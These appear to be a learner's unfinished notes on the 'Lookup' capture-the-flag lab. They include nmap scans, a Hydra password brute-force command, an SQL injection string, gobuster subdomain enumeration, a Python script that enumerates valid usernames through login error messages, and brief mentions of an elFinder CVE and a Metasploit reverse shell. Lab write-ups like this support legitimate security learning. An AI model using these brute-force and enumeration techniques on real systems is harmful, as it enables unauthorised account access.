![image](https://github.com/user-attachments/assets/07dde77b-d273-45ce-92c4-bb0d3f696c90)

# Lookup
- Easy room
- Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.﻿ Note: For free users, it is recommended to use your own VM if you'll ever experience problems visualizing the site. Please allow 3-5 minutes for the VM to fully boot up.

```nmap -v 10.10.4.98
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-18 14:20 GMT
Initiating ARP Ping Scan at 14:20
Scanning 10.10.4.98 [1 port]
Completed ARP Ping Scan at 14:20, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:20
Completed Parallel DNS resolution of 1 host. at 14:20, 0.00s elapsed
Initiating SYN Stealth Scan at 14:20
Scanning 10.10.4.98 [1000 ports]
Discovered open port 80/tcp on 10.10.4.98
Discovered open port 22/tcp on 10.10.4.98
Completed SYN Stealth Scan at 14:20, 0.08s elapsed (1000 total ports)
Nmap scan report for 10.10.4.98
Host is up (0.00015s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:2E:BC:85:FC:E9 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)
```
## I'll look more into port 22(ssh) and 80(http)
```nmap -sS -p- -T4 -sC -sV -oA scan 10.10.4.98
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-18 14:32 GMT
Nmap scan report for 10.10.4.98
Host is up (0.00017s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
MAC Address: 02:2E:BC:85:FC:E9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.78 seconds
```
We have a website redirect at http://lookup.thm. Let's look at that. 
- typing http://lookup.thm fails
- typing 10.10.4.98 fails
- We have to add it to our hosts file
- ```sudo nano /etc/hosts```
- Added line
- 10.10.4.98      lookup.thm
- Browsed to URL lookup.thm
![image](https://github.com/user-attachments/assets/d2fd5eb6-75bc-42f9-89ac-192bc666913e)

### Brute force attack with Burp Suite
- Tried admin:admin for user and password. Says password is incorrect(but not username, so username must be correct)
- Can send captured login attempt to repeater, then intruder and brute force
### Hydra brute force
- ```hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again." -IV -t 64```
- [80][http-post-form] host: lookup.thm   login: admin   password: password123
- 1 of 1 target successfully completed, 1 valid password found
   ```

### SQL injection (No luck)
- Username: admin Password: " or ""="

### Directory Traversal(No luck)
- lookup.thm/admin
- lookup.thm/login
### Gobuster is a tool used to brute-force:
- URIs (directories and files) in web sites. DNS subdomains (with wildcard support). Virtual Host names on target web servers. Open Amazon S3 buckets Open Google Cloud buckets TFTP servers
- gobuster dns -d lookup.thm -w wordlist.txt
- Found files.lookup.thm
- the version of elfinder is vulnerable to an exploit


## python script to enumerate valid usernames
```
import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```
- usernames admin and jose
- back to hydra ```hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V```
- add files.lookup.thm to hosts file

### el finder
-check version and find CVE exploit
### Metasploit and MSFconsole
- get reverse shell using exploit
- 




